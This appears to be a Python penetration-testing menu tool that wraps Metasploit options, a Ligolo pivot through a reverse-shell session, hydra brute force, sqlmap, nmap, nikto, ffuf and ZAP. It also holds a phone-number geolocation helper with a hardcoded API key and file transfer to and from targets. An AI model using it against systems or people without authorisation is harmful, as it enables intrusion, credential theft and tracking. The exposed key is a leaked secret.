import os
import subprocess
import shlex
import scapy.all as scapy
import socket
import time
import sys
import select
import threading
import subprocess
import re
import struct
import random
import requests
import urllib.parse
import readline
import validators
import argparse
import hashlib
import multiprocessing
import json
from collections import Counter
import optparse
import signal
import uuid
import ctypes
import dns.resolver
import dns.rdatatype
import tqdm
import phonenumbers, sys, folium, os, argparse
from colorama import init, Fore
import phonenumbers
from phonenumbers import geocoder, timezone, carrier
from opencage.geocoder import OpenCageGeocode
import folium
import pty
import signal
import textwrap
import shutil
import pexpect
import configparser

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass
    
def banner():
    """
    Prints one of five ASCII art banners based on a randomly generated number.
    """
    # Generate a random integer between 1 and 4
    random_num = random.randint(1, 4)

    # Print one of the five outputs based on the random number generated
    if random_num == 1:
        print("""
8b           d8   ad88                          88b           d88   ad88888ba   88888888888  
`8b         d8'  d8"                            888b         d888  d8"     "8b  88           
 `8b       d8'   88                             88`8b       d8'88  Y8,          88           
  `8b     d8'  MM88MMM  ,adPPYba,   8b,dPPYba,  88 `8b     d8' 88  `Y8aaaaa,    88aaaaa      
   `8b   d8'     88    a8"     "8a  88P'   "Y8  88  `8b   d8'  88    `""""8b,   88"""""      
    `8b d8'      88    8b       d8  88          88   `8b d8'   88          `8b  88           
     `888'       88    "8a,   ,a8"  88          88    `888'    88  Y8a     a8P  88           
      `8'        88     `"YbbdP"'   88          88     `8'     88   "Y88888P"   88  
       
    # Coded By Caleb McDaniels        
""")
    elif random_num == 2:
        print("""
Yb    dP  d8b            8b   d8 .d88b. 8888 
 Yb  dP   8'  .d8b. 8d8b 8YbmdP8 YPwww. 8www 
  YbdP   w8ww 8' .8 8P   8  "  8     d8 8    
   YP     8   `Y8P' 8    8     8 `Y88P' 8   
    
    # Coded By Caleb McDaniels
""")
    elif random_num == 3 or random_num == 4:
        print("""
                ,...                                                 
`7MMF'   `7MF'.d' ""            `7MMM.     ,MMF' .M""bgd `7MM""YMM 
  `MA     ,V  dM`                 MMMb    dPMM  ,MI    "Y   MM    `7 
   VM:   ,V  mMMmm,pW"Wq.`7Mb,od8 M YM   ,M MM  `MMb.       MM      
    MM.  M'   MM 6W'   `Wb MM' "' M  Mb  M' MM    `YMMNq.   MM""MM   
    `MM A'    MM 8M     M8 MM     M  YM.P'  MM  .     `MM   MM      
     :MM;     MM YA.   ,A9 MM     M  `YM'   MM  Mb     dM   MM       
      VF    .JMML.`Ybmd9'.JMML. .JML. `'  .JMML.P"Ybmmd"  .JMML.   
        
    # Coded By Caleb McDaniels
""")

sessions = {}
session_counter = 1
terminal_size = shutil.get_terminal_size((80, 20))  # Default to 80x20 if unable to determine
terminal_width = terminal_size.columns

# Initialize a ConfigParser object
config = configparser.ConfigParser()

# Define default values for Metasploit parameters as variables
default_payload = ""
default_payloadfile = ""
default_lport = ""
default_lhost = ""
default_rhosts = ""
default_password_wordlist = ""
default_user_wordlist = ""
default_exploit_target = ""
default_encoder = ""
default_exit_on_session = ""
default_verbose = ""
default_rport = ""
default_evasion = ""
default_nop = ""
default_badchars = ""
default_iterations = ""
default_timeout = ""
default_http_user_agent = ""
default_ssl = ""

banner()

def send_metasploit_commands(master):

    commands = [
        f"set payload {default_payload}",
        f"set payloadfile {default_payloadfile}",
        f"set lport {default_lport}",
        f"set lhost {default_lhost}",
        f"set rhosts {default_rhosts}",
        f"set password_wordlist {default_password_wordlist}",
        f"set user_wordlist {default_user_wordlist}",
        f"set exploit_target {default_exploit_target}",
        f"set encoder {default_encoder}",
        f"set exit_on_session {default_exit_on_session}",
        f"set verbose {default_verbose}",
        f"set rport {default_rport}",
        f"set evasion {default_evasion}",
        f"set nop {default_nop}",
        f"set badchars {default_badchars}",
        f"set iterations {default_iterations}",
        f"set timeout {default_timeout}",
        f"set http_user_agent {default_http_user_agent}",
        f"set ssl {default_ssl}",
        # Add other parameters as needed
    ]

    for command in commands:
        # Extract the parameter name from the command
        param_name = command.split()[1]
        # Get the corresponding default value
        default_value = globals()[f"default_{param_name}"]
        # Skip empty values
        if not default_value:
            continue
        # Send the command to Metasploit
        os.write(master, f"{command}\n".encode())

# Function to load Metasploit parameters from a configuration file
def load_metasploit_params():
    global default_payload, default_payloadfile, default_lport, default_lhost, default_rhosts
    global default_password_wordlist, default_user_wordlist, default_exploit_target, default_encoder
    global default_exit_on_session, default_verbose, default_rport, default_evasion, default_nop
    global default_badchars, default_iterations, default_timeout, default_http_user_agent, default_ssl
    global default_setg, default_advanced_options

    try:
        config.read('metasploit_config.ini')
        default_payload = config.get('Metasploit', 'payload', fallback=default_payload)
        default_payloadfile = config.get('Metasploit', 'payloadfile', fallback=default_payloadfile)
        default_lport = config.get('Metasploit', 'lport', fallback=default_lport)
        default_lhost = config.get('Metasploit', 'lhost', fallback=default_lhost)
        default_rhosts = config.get('Metasploit', 'rhosts', fallback=default_rhosts)
        default_password_wordlist = config.get('Metasploit', 'password_wordlist', fallback=default_password_wordlist)
        default_user_wordlist = config.get('Metasploit', 'user_wordlist', fallback=default_user_wordlist)
        default_exploit_target = config.get('Metasploit', 'exploit_target', fallback=default_exploit_target)
        default_encoder = config.get('Metasploit', 'encoder', fallback=default_encoder)
        default_exit_on_session = config.getboolean('Metasploit', 'exit_on_session', fallback=default_exit_on_session)
        default_verbose = config.getboolean('Metasploit', 'verbose', fallback=default_verbose)
        default_rport = config.get('Metasploit', 'rport', fallback=default_rport)
        default_evasion = config.get('Metasploit', 'evasion', fallback=default_evasion)
        default_nop = config.get('Metasploit', 'nop', fallback=default_nop)
        default_badchars = config.get('Metasploit', 'badchars', fallback=default_badchars)
        default_iterations = config.getint('Metasploit', 'iterations', fallback=default_iterations)
        default_timeout = config.getint('Metasploit', 'timeout', fallback=default_timeout)
        default_http_user_agent = config.get('Metasploit', 'http_user_agent', fallback=default_http_user_agent)
        default_ssl = config.getboolean('Metasploit', 'ssl', fallback=default_ssl)
        
        print(f"[+] metasploit_config.ini loaded")
    except configparser.Error as e:
        print(f"Error loading configuration: {e}")
        
# Function to save Metasploit parameters to a configuration file
def save_metasploit_params():
    config['Metasploit'] = {
        'payload': default_payload,
        'payloadfile': default_payloadfile,
        'lport': default_lport,
        'lhost': default_lhost,
        'rhosts': default_rhosts,
        'password_wordlist': default_password_wordlist,
        'user_wordlist': default_user_wordlist,
        'exploit_target': default_exploit_target,
        'encoder': default_encoder,
        'exit_on_session': str(default_exit_on_session),
        'verbose': str(default_verbose),
        'rport': default_rport,
        'evasion': default_evasion,
        'nop': default_nop,
        'badchars': default_badchars,
        'iterations': str(default_iterations),
        'timeout': str(default_timeout),
        'http_user_agent': default_http_user_agent,
        'ssl': str(default_ssl),
    }

    with open('metasploit_config.ini', 'w') as configfile:
        config.write(configfile)
        
    print(f"[+] metasploit_config.ini saved")

# Function to print the current values of Metasploit parameters
def print_current_defaults():
    print("Current Metasploit Parameter Values:\n")
    print(f"default_payload: {default_payload}")
    print(f"default_payloadfile: {default_payloadfile}")
    print(f"default_lport: {default_lport}")
    print(f"default_lhost: {default_lhost}")
    print(f"default_rhosts: {default_rhosts}")
    print(f"default_password_wordlist: {default_password_wordlist}")
    print(f"default_user_wordlist: {default_user_wordlist}")
    print(f"default_exploit_target: {default_exploit_target}")
    print(f"default_encoder: {default_encoder}")
    print(f"default_exit_on_session: {default_exit_on_session}")
    print(f"default_verbose: {default_verbose}")
    print(f"default_rport: {default_rport}")
    print(f"default_evasion: {default_evasion}")
    print(f"default_nop: {default_nop}")
    print(f"default_badchars: {default_badchars}")
    print(f"default_iterations: {default_iterations}")
    print(f"default_timeout: {default_timeout}")
    print(f"default_http_user_agent: {default_http_user_agent}")
    print(f"default_ssl: {default_ssl}")

# Function to update Metasploit parameters with user input
def update_metasploit_params():

    global default_payload, default_payloadfile, default_lport, default_lhost, default_rhosts
    global default_password_wordlist, default_user_wordlist, default_exploit_target, default_encoder
    global default_exit_on_session, default_verbose, default_rport, default_evasion, default_nop
    global default_badchars, default_iterations, default_timeout, default_http_user_agent, default_ssl
    global default_setg, default_advanced_options

    # Define a dictionary to hold the default values
    default_values = {
        'payload': default_payload,
        'payloadfile': default_payloadfile,
        'lport': default_lport,
        'lhost': default_lhost,
        'rhosts': default_rhosts,
        'password_wordlist': default_password_wordlist,
        'user_wordlist': default_user_wordlist,
        'exploit_target': default_exploit_target,
        'encoder': default_encoder,
        'exit_on_session': default_exit_on_session,
        'verbose': default_verbose,
        'rport': default_rport,
        'evasion': default_evasion,
        'nop': default_nop,
        'badchars': default_badchars,
        'iterations': default_iterations,
        'timeout': default_timeout,
        'http_user_agent': default_http_user_agent,
        'ssl': default_ssl,
    }

    # Iterate through each parameter to update the values
    print()
    for param, value in default_values.items():
        user_input = input(f"Enter new value for {param} (default: {value}): ")
        if user_input:
            default_values[param] = user_input

    # Update the default values with the new values
    default_payload = default_values['payload']
    default_payloadfile = default_values['payloadfile']
    default_lport = default_values['lport']
    default_lhost = default_values['lhost']
    default_rhosts = default_values['rhosts']
    default_password_wordlist = default_values['password_wordlist']
    default_user_wordlist = default_values['user_wordlist']
    default_exploit_target = default_values['exploit_target']
    default_encoder = default_values['encoder']
    default_exit_on_session = default_values['exit_on_session']
    default_verbose = default_values['verbose']
    default_rport = default_values['rport']
    default_evasion = default_values['evasion']
    default_nop = default_values['nop']
    default_badchars = default_values['badchars']
    default_iterations = default_values['iterations']
    default_timeout = default_values['timeout']
    default_http_user_agent = default_values['http_user_agent']
    default_ssl = default_values['ssl']
    
    print()
    save_metasploit_params()

def route(master):

    # Check if the required agent file has been uploaded
    uploaded = input("Has the required agent file been uploaded? (y/N): ").strip().lower()
    if uploaded.lower() != 'y':
        print("[-] Please upload the required agent file before running this module.\n")
        return

    # Get the agent file name
    agent_file_name = ""
    while not agent_file_name:
        agent_file_name = input("Enter the agent file name: ").strip()
        print()
        if not agent_file_name:
            print("[-] The agent file name cannot be blank. Please enter a valid file name.\n")

    # Find an available port
    port = find_available_port()
            
    internal_network = ""
    while not internal_network:
        internal_network = input("Enter the internal network: ").strip()
        print()
        if not internal_network:
            print("[-] The internal network cannot be blank. Please enter a valid network.\n")
        elif not is_valid_network(internal_network):
            print("[-] Invalid network format. Must end in 0 and include the subnet mask.\n")
            internal_network = ""
    
    bash_command_1 = f"sudo ip tuntap add user $(whoami) mode tun ligolo"
    bash_command_2 = f"sudo ip link set ligolo up"
    bash_command_3 = f"sudo ip route add {internal_network} dev ligolo"
    
    first_command_sequence = f"{bash_command_1} && {bash_command_2} && {bash_command_3}"
    
    ligolo_command_1 = f"./proxy -selfcert -laddr 0.0.0.0:{port}"
    
    agent_command = f"{agent_file_name} -connect {default_lhost}:{port} -ignore-cert\n"
    
    try:
        subprocess.Popen(["bash", "-c", first_command_sequence])
        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"{ligolo_command_1}; exec bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        # Instruct the user to execute the agent in the reverse shell
        os.write(master, agent_command.encode())
        time.sleep(2)
        os.write(master, f"background\n".encode())
        os.write(master, f"y\n".encode())
        
    except Exception as e:
        print(f"[-] An error occured {e}")
        
def find_available_port(start_port=9000, end_port=9999):
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.bind(('', port))  # Try to bind to the port
                return port  # If successful, return the port number
            except socket.error:
                continue  # If the port is in use, continue to the next port
    raise RuntimeError(f"No available ports in the range {start_port}-{end_port}")
    
def is_valid_network(network):
    parts = network.split('/')
    if len(parts) != 2:
        return False
    ip_part, mask_part = parts
    ip_parts = ip_part.split('.')
    
    # Ensure that the last octet of the IP address contains a "0" before the subnet mask
    if len(ip_parts) != 4 or not ip_parts[-1].startswith("0"):
        return False
    
    for part in ip_parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    
    try:
        mask = int(mask_part)
        if mask < 0 or mask > 32:
            return False
    except ValueError:
        return False
    
    return True

def locate(phone_number):
    # Clean the phone number
    cleaned_phone_number = clean_phone_number(phone_number)

    # Process the phone number
    location = process_number(cleaned_phone_number)
    if location:
        latitude, longitude = get_approx_coordinates(location)

def process_number(number):
    try:
        parsed_number = phonenumbers.parse(number)
        print(f"[+] Attempting to track location of "
              f"{phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}.")
        print(f"[+] Time Zone ID: {timezone.time_zones_for_number(parsed_number)}")

        location = geocoder.description_for_number(parsed_number, "en")
        if location:
            print(f"[+] Region: {location}")
        else:
            print(f"[-] Region: Unknown")

        service_provider = carrier.name_for_number(parsed_number, 'en')
        if service_provider:
            print(f"[+] Service Provider:  {service_provider}")

        return location

    except Exception as e:
        print(f"[-] Error: {e}. Please specify a valid phone number (with country code) ")
        return None

def get_approx_coordinates(location):
    try:
        coder = OpenCageGeocode("6e50ad57f06b4222a8586a7125bdef50")  # IDGAF if someone uses my API key
        results = coder.geocode(location)
        latitude = results[0]['geometry']['lat']
        longitude = results[0]['geometry']['lng']
        print(f"[+] Latitude: {latitude}, Longitude: {longitude}")
        return latitude, longitude

    except Exception as e:
        print(f"[-] Error: {e}. Could not get the location of this number. Please specify a valid phone number ")
        return None, None

def clean_phone_number(phone_number):
    return ''.join(char for char in phone_number if char.isdigit() or char == '+')

def send_file(filename):
    try:
        # Device's IP address
        SERVER_HOST = "0.0.0.0"
        SERVER_PORT = 8080
        # Receive 4096 bytes each time
        SEPARATOR = "<SEPARATOR>"
        BUFFER_SIZE = 4096
        # Create the server socket
        # TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set a timeout for socket operations
        s.settimeout(10)  # connection should be instant so 10 seconds is fine
        # Set the socket option to allow reusing the address
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to our local address
        s.bind((SERVER_HOST, SERVER_PORT))
        # Enable our server to accept connections
        # 5 here is the number of unaccepted connections that
        # the system will allow before refusing new connections
        s.listen(5)
        # Accept connection if there is any
        client_socket, address = s.accept()

        # Check if the file exists
        if not os.path.isfile(filename):
            print("[-] File not found")
            return

        # Get the file size
        filesize = os.path.getsize(filename)
        client_socket.send(str(filesize).encode())

        # Start sending the file
        print(f"[+] Sending {filename} with filesize {filesize} via TCP port {SERVER_PORT}")
        with open(filename, "rb") as f:
            while True:
                # Read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # File sending is done
                    break
                # Send the bytes to the server
                client_socket.sendall(bytes_read)
        print(f"[+] {filename} sent")
        # Close the socket
        client_socket.close()
        # Close the server socket
        s.close()
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def receive_file(filename):
    try:
        # Device's IP address
        SERVER_HOST = "0.0.0.0"
        SERVER_PORT = 8080
        # Receive 4096 bytes each time
        SEPARATOR = "<SEPARATOR>"
        BUFFER_SIZE = 4096
        # Create the server socket
        # TCP socket
        s = socket.socket()
        # Set a timeout for socket operations
        s.settimeout(10) #connection should be instant so 10 seconds is fine
        # Set the socket option to allow reusing the address
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to our local address
        s.bind((SERVER_HOST, SERVER_PORT))
        # Enable our server to accept connections
        # 5 here is the number of unaccepted connections that
        # the system will allow before refusing new connections
        s.listen(5)
        # Accept connection if there is any
        client_socket, address = s.accept()

        # Receive the file size
        filesize_str = client_socket.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
        try:
            filesize = int(filesize_str)
        except ValueError:
            raise ValueError("Invalid filesize or file not found")

        # Check if filesize is valid
        if filesize <= 0:
            raise ValueError("Invalid filesize or file not found")

        # Start receiving the file from the socket
        # and writing to the file stream
        print(f"[+] Receiving {filename} with filesize {filesize} via TCP port {SERVER_PORT}")
        with open(filename, "wb") as f:
            while True:
                # Read 1024 bytes from the socket (receive)
                bytes_read = client_socket.recv(BUFFER_SIZE)
                if not bytes_read:
                    # Nothing is received
                    # File transmitting is done
                    break
                # Write to the file the bytes we just received
                f.write(bytes_read)

        print(f"[+] {filename} received.")
        # Close the client socket
        client_socket.close()
        # Close the server socket
        s.close()
    except socket.timeout:
        print(f"[-] Connection timed out. Port for file receiving is set to {SERVER_PORT}")
    except ValueError as ve:
        print(f"[-] An error occurred: {ve}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

def fuzz():
    print("\n**USE BASH IF YOU WANT TO ENTER WHOLE FFUF COMMANDS**")
    while True:  # Infinite loop to keep asking for URLs until the user exits
        try:
            while True:
                url = input_with_backspace("\nURL to fuzz (Press enter to exit)> ")
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if validators.url(url):
                    break  # Exit the loop if a valid URL is provided
                print("[-] Invalid input. Please enter a valid URL (e.g., https://example.com/).")

            while True:
                custom_wordlist = input_with_backspace("Path/name of the wordlist (Press enter for default): ")
                if custom_wordlist == "":
                    custom_wordlist = "/usr/share/dirb/wordlists/big.txt" #***Default wordlist value*** set to whatever you want.

                try:
                    with open(custom_wordlist):
                        break  # Exit the loop if the file is found
                except FileNotFoundError:
                    print(f"[-] {custom_wordlist} not found. Please try again.")

            while True:
                try:
                    threads_input = input_with_backspace("How many threads? -t (Press enter for default): ")
                    if not threads_input:
                        threads = "100" # Default value if Enter is pressed
                        break
                    else:
                        threads = int(threads_input)
                        if threads <= 0:
                            print("[-] threads must be a positive integer greater than zero.")
                        else:
                            break
                except ValueError:
                    print("[-] Invalid thread count. Please enter a valid integer greater than zero.")

            while True:
                try:
                    filterwords_input = input_with_backspace("Filter by number of words? -fw (Press enter for N/A): ")
                    if not filterwords_input:
                        filterwords = "" #Default value if Enter is pressed
                        break
                    else:
                        # Parse multiple integers from the input using regex
                        filterwords_list = re.findall(r'\d+', filterwords_input)
                        filterwords = ",".join(filterwords_list)
                        if not filterwords:
                            print("[-] -fw must be a positive integer or comma-separated list of positive integers.")
                        else:
                            break
                except ValueError:
                    print("[-] Invalid word count. Please enter a valid integer or comma-separated list of positive integers.")

            while True:
                additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
                if additional_options == "":
                    additional_options = "-c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion"
                    break
                elif additional_options.lower() == "-h":
                    command = "ffuf"
                    subprocess.call(command, shell=True)
                    continue
                else:
                    break

            if not filterwords:
                command = f"ffuf -u {url}/FUZZ -w {custom_wordlist} {additional_options} -t {threads}"
            else:
                command = f"ffuf -u {url}/FUZZ -w {custom_wordlist} {additional_options} -t {threads} -fw {filterwords}"
            print()
            print(command)
            print()
            subprocess.call(command, shell=True)

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return

def sqli():
    try:
        while True:
            text = input_with_backspace("\n Enter sqlmap command, -h, -hh, or --wizard (Press enter to exit)> ")
            if not text:
                break
            elif text.lower() == "-h":
                command = "sqlmap -h"
                subprocess.call(command, shell=True)
                continue
            elif text.lower() == "-hh":
                command = "sqlmap -hh"
                subprocess.call(command, shell=True)
                continue
            elif text.lower() == "--wizard":
                command = "sqlmap --wizard"
                subprocess.call(command, shell=True)
                continue
            else:
                # If the command doesn't start with "sqlmap", prepend it to the command
                if not text.lower().strip().startswith("sqlmap"):
                    text = "sqlmap " + text
                print("\n" + text + "\n")
                subprocess.call(text, shell=True)

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def login():
    try:
        print("\n**USE BASH IF YOU WANT TO ENTER MORE COMPLEX HYRA COMMANDS**")
        while True:
            restore = input_with_backspace("\nRestore previous session? y/n (Press Enter to exit) > ")
            if not restore:
                break
            if restore.lower() == "y":
                command = f"hydra -R"
            elif restore.lower() == "n":
                endpoint = input_with_backspace("Enter the name of the endpoint or press enter to exit (Ex ftp://10.0.0.1)> ")
                if not endpoint:
                    return
                    
                while True:
                    users_file_path = input_with_backspace("Path/name of the users wordlist (Press Enter to exit)> ")
                    if not users_file_path:
                        return  # Exit the loop if the user presses enter (no custom wordlist)
                    try:
                        with open(users_file_path):
                            break  # Exit the loop if the file is found
                    except FileNotFoundError:
                        print(f"[-] {users_file_path} not found. Please try again.")

                while True:
                    passwords_file_path = input_with_backspace("Path/name of the passwords wordlist (Press Enter to exit)> ")
                    if not passwords_file_path:
                        return  # Exit the loop if the user presses enter (no custom wordlist)
                    try:
                        with open(passwords_file_path):
                            break  # Exit the loop if the file is found
                    except FileNotFoundError:
                        print(f"[-] {passwords_file_path} not found. Please try again.")

                command = f"hydra -L {users_file_path} -P {passwords_file_path} {endpoint}"
            else:
                print("[-] Invalid input. Please enter either y or n.")
                continue
            
            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
        
def scan():
    try:
        while True:
            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
            if not ip:
                break
            elif validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue

                while True:
                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
                    if not additional_options:
                        command = f"nmap -p- -sC -sV {hostname}"
                    elif additional_options.lower() == "-h":
                        command = "nmap -h"
                    else:
                        command = f"nmap {additional_options} {hostname}"

                    print()
                    print(command)
                    print()
                    try:
                        subprocess.call(command, shell=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[-] Error running command: {e}")

                    # Break the inner loop only if valid options were provided
                    if additional_options.lower() != "-h":
                        break

            elif validate_ip_address(ip):
                while True:
                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
                    if not additional_options:
                        command = f"nmap -p- -sC -sV {ip}"
                    elif additional_options.lower() == "-h":
                        command = "nmap -h"
                    else:
                        command = f"nmap {additional_options} {ip}"

                    print()
                    print(command)
                    print()
                    try:
                        subprocess.call(command, shell=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[-] Error running command: {e}")

                    # Break the inner loop only if valid options were provided
                    if additional_options.lower() != "-h":
                        break

            else:
                print("[-] Invalid IP or URL entered. Please try again.")
                continue

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def ping():
    try:
        while True:
            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
            if not ip:
                break
            elif validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue
                command = f"nmap -sn {hostname}"
            else:
                if validate_ip_address(ip):
                    command = f"nmap -sn {ip}"
                else:
                    print("[-] Invalid IP or URL entered. Please try again.")
                    continue
            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def sbust():
    try:
        while True:
            ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
            if not ip:
                break
            while not validators.url(ip):
                print("[-] Invalid URL entered. Please try again.")
                ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
                if not ip:
                    break
            if not ip:
                break

            hostname = urllib.parse.urlsplit(ip).hostname

            command = f"python3 sublist3r.py -t 16 -d {hostname}"

            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def sbrute():
    try:
        while True:
            ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
            if not ip:
                break
            while not validators.url(ip):
                print("[-] Invalid URL entered. Please try again.")
                ip = input_with_backspace("URL to scan (Press enter to exit)> ")
                if not ip:
                    break
            if not ip:
                break

            hostname = urllib.parse.urlsplit(ip).hostname
            command = f"python3 subbrute.py {hostname}"

            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
        
def vulnwebnikto():
    try:
        while True:
            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
            if not ip:
                break
            elif validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue

                while True:
                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
                    if not additional_options:
                        command = f"nikto -h {hostname} -Display 4P -C all"
                    elif additional_options.lower() == "-h":
                        command = "nikto -Help"
                    else:
                        command = f"nikto {additional_options} {hostname}"

                    print()
                    print(command)
                    print()
                    try:
                        subprocess.call(command, shell=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[-] Error running command: {e}")

                    # Break the inner loop only if valid options were provided
                    if additional_options.lower() != "-h":
                        break

            elif validate_ip_address(ip):
                while True:
                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
                    if not additional_options:
                        command = f"nikto -h {ip} -Display 4P -C all"
                    elif additional_options.lower() == "-h":
                        command = "nikto -Help"
                    else:
                        command = f"nikto {additional_options} {ip}"

                    print()
                    print(command)
                    print()
                    try:
                        subprocess.call(command, shell=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[-] Error running command: {e}")

                    # Break the inner loop only if valid options were provided
                    if additional_options.lower() != "-h":
                        break

            else:
                print("[-] Invalid IP or URL entered. Please try again.")
                continue

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def vulnwebzap():
    print("\n**OUTFILE OR OWASP GUI IS RECOMMENDED**")
    allowed_extensions = (".html", ".json", ".md", ".xml")
    try:
        while True:
            ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
            if not ip:
                break
            while not validators.url(ip):
                print("[-] Invalid URL entered. Please try again.")
                ip = input_with_backspace("URL to scan (Press enter to exit)> ")
                if not ip:
                    break
            if not ip:
                break
            zap_dir = ""
            while not zap_dir:
                zap_dir = input_with_backspace("Directory containing zap.sh (Press enter for default /usr/share/zaproxy/): ")
                if not zap_dir:
                    zap_dir = "/usr/share/zaproxy/"
                zap_path = os.path.join(zap_dir, "zap.sh")
                try:
                    with open(zap_path):
                        pass
                except FileNotFoundError:
                    print(f"[-] zap.sh not found in {zap_dir}. Please try again.")
                    zap_dir = ""

            save = None
            while save is None:
                save = input_with_backspace("save output with filename (Press enter for N/A): ")
                if not save:
                    break
                if not save.endswith(allowed_extensions):
                    print(f"[-] Invalid file extension. Accepted file types are .html, .json, .md, and .xml.")
                    save = None

            if save is None:
                command = f"{zap_dir}./zap.sh -quickurl {ip} -quickprogress -cmd -silent"
            else:
                command = f"{zap_dir}./zap.sh -quickurl {ip} -quickout ~/{save} -quickprogress -cmd -silent"
            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def vulnport():
    try:
        while True:
            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
            if not ip:
                break
            elif validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue
                command = f"nmap -p- -sV --script vuln {hostname}"
            else:
                if validate_ip_address(ip):
                    command = f"nmap -p- -sV --script vuln {ip}"
                else:
                    print("[-] Invalid IP or URL entered. Please try again.")
                    continue
            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")

def dbust():
    print("**FUZZ ENUMERATES MUCH FASTER**")

    while True:  # Infinite loop to keep asking for URLs until the user exits
        try:
            while True:
                url = input_with_backspace("\nURL to scan (Press enter to exit)> ")
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if validators.url(url):
                    break  # Exit the loop if a valid URL is provided
                print("[-] Invalid input. Please enter a valid URL (e.g., https://example.com/).")

            while True:
                custom_wordlist = input_with_backspace("Custom wordlist (Press enter for default): ")
                if custom_wordlist == "":
                    custom_wordlist = "/usr/share/dirb/wordlists/common.txt"  # ***Default wordlist value*** set to whatever you want.
                    break  # Exit the loop if the user presses enter (default wordlist)
                try:
                    with open(custom_wordlist):
                        break  # Exit the loop if the file is found
                except FileNotFoundError:
                    print(f"[-] {custom_wordlist} not found. Please try again.")

            while True:
                additional_options = input_with_backspace("Additional options (-h for list. Press enter for default): ")
                if additional_options.lower() == "-h":
                    command = "dirb"
                    print()
                    subprocess.call(command, shell=True)
                else:
                    command = f"dirb {url} {custom_wordlist} {additional_options}"
                    print()
                    print(command)
                    print()
                    subprocess.call(command, shell=True)
                if additional_options.lower() != "-h":
                    break

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return

def spider():
    while True:  # Infinite loop to keep asking for URLs until the user exits
        try:
            while True:
                target_url = input_with_backspace("\nURL to scan (Press enter to exit)> ")
                if not target_url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if not validators.url(target_url):
                    print("[-] Invalid input. Please enter a valid URL (e.g., https://example.com/).")
                else:
                    break

            while True:
                try:
                    depth_input = input_with_backspace("Crawl depth (Press enter for default): ")
                    if not depth_input:
                        depth = 5  # Default depth value
                        break
                    else:
                        depth = int(depth_input)
                        if depth <= 0:
                            print("[-] Depth must be a positive integer greater than zero.")
                        else:
                            break
                except ValueError:
                    print("[-] Invalid depth. Please enter a valid integer greater than zero.")

            filename = None
